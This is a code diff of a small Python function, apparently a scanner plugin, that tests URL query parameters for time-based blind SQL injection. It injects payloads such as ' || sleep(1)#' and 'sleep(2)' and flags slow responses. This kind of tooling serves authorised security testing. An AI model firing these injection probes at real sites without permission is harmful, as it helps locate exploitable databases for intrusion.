@@ -1,20 +1,36 @@
 from time import time
-from requests import get
+from json import dumps
+
+from requests import get, exceptions
 
 from urllib.parse import urlparse, parse_qs
 
 
-def go(k):
-    o = urlparse(k['url'])
+def go(web_request):
+    result = []
+
+    o = urlparse(web_request['url'])
     query = parse_qs(o.query)
     url = o._replace(query=None).geturl()
-    if 'pw' in query:
-        query['pw'] = ' || sleep(1)#'
-        query['id'] = '\\'
+    for k, v in query.items():
+        tmp_value = v
+        query[k] = 'sleep(2)'
         a1 = time()
-        get(url, params=query)
+        try:
+            r = get(url, params=query, timeout=5)
+        except exceptions.Timeout:
+            pass
         a2 = time()
-        if a2 - a1 >= 1:
-            return True
+        if a2 - a1 >= 2:
+            tmp = {}
+            tmp['url'] = url
+            tmp['method'] = web_request['method']
+            tmp['query'] = query
+            tmp['body'] = query
+            result.append(dumps(tmp))
+        query[k] = tmp_value
+
+    if len(result) >= 1:
+        return result
     else:
-        return False
+        return []
